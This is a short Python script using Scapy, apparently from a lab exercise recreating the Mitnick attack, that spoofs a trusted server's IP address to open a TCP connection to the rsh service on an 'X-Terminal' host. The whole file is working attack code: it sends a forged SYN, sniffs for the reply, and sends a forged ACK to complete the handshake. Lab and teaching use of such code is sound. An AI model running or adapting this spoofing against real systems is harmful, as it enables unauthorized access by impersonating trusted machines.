#!/usr/bin/python3
from scapy.all import *

##Step 1

# Define IPs and ports for the connection
x_ip = "10.9.0.5"     # X-Terminal IP
x_port = 514          # rsh service port on X-Terminal
srv_ip = "10.9.0.6"   # Trusted Server IP
srv_port = 1023       # Source port for the SYN packet

# Send a spoofed SYN packet
syn_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="S", seq=1000)
send(syn_pkt)
print("Spoofed SYN packet sent from Trusted Server to X-Terminal.")


##Step 2

# Function to spoof an ACK packet in response to a SYN+ACK
def spoof_ack(pkt):
    if pkt[TCP].flags == "SA":  # SYN+ACK packet
        seq_num = pkt[TCP].seq + 1  # Sequence number to acknowledge
        ack_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="A", seq=1001, ack=seq_num)
        send(ack_pkt)
        print("Spoofed ACK sent to complete the handshake.")

# Sniff for SYN+ACK from X-Terminal and call spoof_ack
sniff(filter=f"tcp and src host {x_ip} and dst port {srv_port}", prn=spoof_ack, count=1)
